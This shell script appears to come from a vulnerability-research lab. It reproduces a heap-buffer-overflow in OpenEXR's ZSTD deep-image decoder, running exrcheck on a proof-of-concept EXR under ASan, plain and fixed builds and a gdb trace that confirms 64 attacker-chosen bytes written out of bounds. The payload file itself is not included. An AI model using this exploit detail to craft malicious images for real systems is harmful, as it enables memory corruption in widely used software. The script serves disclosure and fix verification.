#!/bin/sh
# W179: the mixed-channel chosen-byte result is reachable from the UNMODIFIED
# upstream exrcheck -c tool, not only from the purpose-built guarded harness.
# Deep ZSTD EXR: FLOAT "A" before HALF "Z", split=64=unpacked_size, 64
# file-chosen bytes (0x3c) copied to outPtr+128 at internal_zstd.c:472.
# Addresses, PIDs, paths and BuildIds are normalized; offsets and byte values
# are preserved. Requires the gitignored pinned build trees and EXRs from
# harness/mixed-check.sh (which regenerates and hash-checks them).
set -eu
cd "$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)"
mkdir -p evidence

norm() {
    awk '
        { gsub(/==[0-9]+==/, "==PID==") }
        { gsub(/BuildId: [0-9a-f]+/, "BuildId: ID") }
        { gsub(/\/home\/mesh-home\/mishe-tauftauf2shell\/lab\/openexr2shell-real/, "LAB") }
        { gsub(/\/home\/mesh-home\/mishe-tauftauf2shell/, "SITE") }
        { gsub(/0x[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]*/, "ADDR") }
        { print }
    '
}

RAW=$(mktemp)
trap 'rm -f "$RAW"' EXIT

run() {
    name=$1
    shift
    set +e
    "$@" > "$RAW" 2>&1
    rc=$?
    set -e
    norm < "$RAW" > "evidence/$name.out"
    printf 'RC=%s\n' "$rc" >> "evidence/$name.out"
}

test "$(sha256sum work-mixed/poc_mixed.exr | cut -d' ' -f1)" = \
    484b1c35f66e18db3e263346e100da44a199e4bdf08c0678afe113b042593a52
test "$(sha256sum work-mixed/baseline_deep_mixed.exr | cut -d' ' -f1)" = \
    9aa2073dce40b893f648f0fb078b738538e65a569cb00079d4128612e7fa3d04

export ASAN_OPTIONS=detect_leaks=0:abort_on_error=0:log_path=stderr
run exrcheck-mixed-asan-baseline ./build-vuln-asan/bin/exrcheck -c work-mixed/baseline_deep_mixed.exr
run exrcheck-mixed-asan-poc ./build-vuln-asan/bin/exrcheck -c work-mixed/poc_mixed.exr
run exrcheck-mixed-fixed-asan-poc ./build-fixed-asan/bin/exrcheck -c work-mixed/poc_mixed.exr
unset ASAN_OPTIONS
run exrcheck-mixed-plain-baseline ./build-vuln-plain/bin/exrcheck -c work-mixed/baseline_deep_mixed.exr
run exrcheck-mixed-plain-poc ./build-vuln-plain/bin/exrcheck -c work-mixed/poc_mixed.exr

gdb -q -batch -x harness/gdb-exrcheck-mixed.cmd ./build-vuln-plain/bin/exrcheck \
    2>&1 | norm > evidence/exrcheck-mixed-gdb.out

grep -q '^RC=0$' evidence/exrcheck-mixed-asan-baseline.out
grep -q 'OK' evidence/exrcheck-mixed-asan-baseline.out
grep -q '^RC=1$' evidence/exrcheck-mixed-asan-poc.out
grep -q 'ERROR: AddressSanitizer: heap-buffer-overflow' evidence/exrcheck-mixed-asan-poc.out
grep -q 'READ of size 128' evidence/exrcheck-mixed-asan-poc.out
grep -q 'internal_zstd.c:472' evidence/exrcheck-mixed-asan-poc.out
grep -q 'internal_zstd.c:1335' evidence/exrcheck-mixed-asan-poc.out
grep -q 'exr_decoding_run' evidence/exrcheck-mixed-asan-poc.out
grep -q 'ImfCheckFile.cpp:1467' evidence/exrcheck-mixed-asan-poc.out
grep -q 'main.cpp:166' evidence/exrcheck-mixed-asan-poc.out
grep -q '^RC=1$' evidence/exrcheck-mixed-fixed-asan-poc.out
grep -q 'bad' evidence/exrcheck-mixed-fixed-asan-poc.out
! grep -q 'ERROR: AddressSanitizer' evidence/exrcheck-mixed-fixed-asan-poc.out
grep -q '^RC=0$' evidence/exrcheck-mixed-plain-baseline.out
grep -q 'OK' evidence/exrcheck-mixed-plain-baseline.out
grep -q '^RC=139$' evidence/exrcheck-mixed-plain-poc.out
grep -q 'SINK-ENTER' evidence/exrcheck-mixed-gdb.out
grep -q 'COPY1 dst=ADDR src=ADDR len=128 dst-out=0 src-in=64' evidence/exrcheck-mixed-gdb.out
grep -q 'COPY2 dst=ADDR src=ADDR len=64 dst-out=128 src-in=0' evidence/exrcheck-mixed-gdb.out
grep -q 'internal_zstd.c:472' evidence/exrcheck-mixed-gdb.out
[ "$(grep -o '0x3c' evidence/exrcheck-mixed-gdb.out | wc -l)" -ge 24 ]

printf 'RESULT PASS\n'
grep -E 'SINK-ENTER|COPY[12] dst=|0x3c' evidence/exrcheck-mixed-gdb.out
sha256sum evidence/exrcheck-mixed-asan-baseline.out evidence/exrcheck-mixed-asan-poc.out \
    evidence/exrcheck-mixed-fixed-asan-poc.out evidence/exrcheck-mixed-plain-baseline.out \
    evidence/exrcheck-mixed-plain-poc.out evidence/exrcheck-mixed-gdb.out
